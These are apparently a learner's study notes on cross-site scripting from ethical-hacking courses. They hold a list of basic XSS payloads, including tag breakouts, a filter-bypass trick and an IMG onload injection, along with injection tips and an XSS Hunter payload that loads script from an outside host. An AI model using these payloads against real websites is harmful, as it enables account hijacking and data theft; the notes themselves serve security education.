XSS
----

Lessons on XSS
--------------

from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
* "XSS - Introduction" - https://academy.tcm-sec.com/courses/1152300/lectures/47778441
- XSS makes use of JavaScript to run malicious actions in a target's web browser
- In order to understand the basics of JavaScript take 20-30 minutes and study it using this free interactive site: https://www.w3schools.com/js/
- Traditionally, the command `alert(1)` was used to check for XSS. Due to changes in Chrome it is better to use `print()` or `prompt("hello")`; see here: https://portswigger.net/research/alert-is-dead-long-live-print
* "XSS - DOM Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778510
- With DOM based XSS the vulnerability is on the client side (not the server side). This means that the vulnerability exists in the way the browser application installed on the user device interprets the JavaScript of the XSS vulnerable website in question. If you open the Network tab in the Developer Tools of the website, you will see that the input that is being posted is not going out to a server and coming back but rather staying on the local device. You can test this by entering an input; if when you enter an input nothing (no 200 or 400 messages; no GET or POST messages) appear in the Network tab, this means that everything is happening in the client.
* "XSS - Stored Lab" - https://academy.tcm-sec.com/courses/1152300/lectures/47778529
* "XSS - Challenge Walkthrough" - https://academy.tcm-sec.com/courses/1152300/lectures/47778530

---------------------------------------------------
Some Basic XSS Payloads:

* basic
<script>alert('XSS');</script>

* escape insert tab - ">
"><script>alert('XSS');</script>

* escape text area - </textarea>
</textarea><script>alert('XSS');</script>

* escape JavaScript command - '; ____ //
';alert('XSS');//

* bypassing filter that filters out the word script - sscriptcript
<sscriptcript>alert('XSS');</sscriptcript>

* escape IMG tag - onload=
/NAME_OF_FOLDER/NAME_OF_FILE.jpg" onload="alert('XSS');

[hat tip: TryHackMe - https://tryhackme.com/room/xssgi]
------------------------------------------------------

Sites with more XSS payloads:
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* https://github.com/payloadbox/xss-payload-list
* https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
* http://www.xss-payloads.com/ [hat tip: TryHackMe]
* https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
* https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss


------------------------------------------------------
Tips on XSS
------------
* In order to prevent the website from running all the HTML code (found in the source code) that follows our XSS script injection, insert the "comment tag" at the end of the XSS injection:
<--
[hat tip: Jonathan Erez]

*  Make sure to try XSS injection in each input box - sometimes one wasn't sanitized even though the others were
*  Make sure to try XSS injection in URL input box; sometimes the input was only sanitized in the input form boxes and not in the URL; especially for inputs that are drop down menus and you can only manipulate things in the URL
[hat tip: ThriveDX]

-----------------------------------------------------
XSS Tools
---------

* XSS Hunter
https://xsshunter.com/
XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.
[hat tip: TryHackMe]


* XSS Automation Tool
https://github.com/EmperialX/XSS-Automation-Tool
"XSS automation tool helps hackers identify and exploit cross-site scripting vulnerabilities in web apps. Tests for reflected and persistent XSS. Customize request headers, cookies, proxies, and auth. Find and exploit vulnerabilities with our XSS automation tool."
[hat tip: Eli on Cyber Together 2 (WhatsApp)]
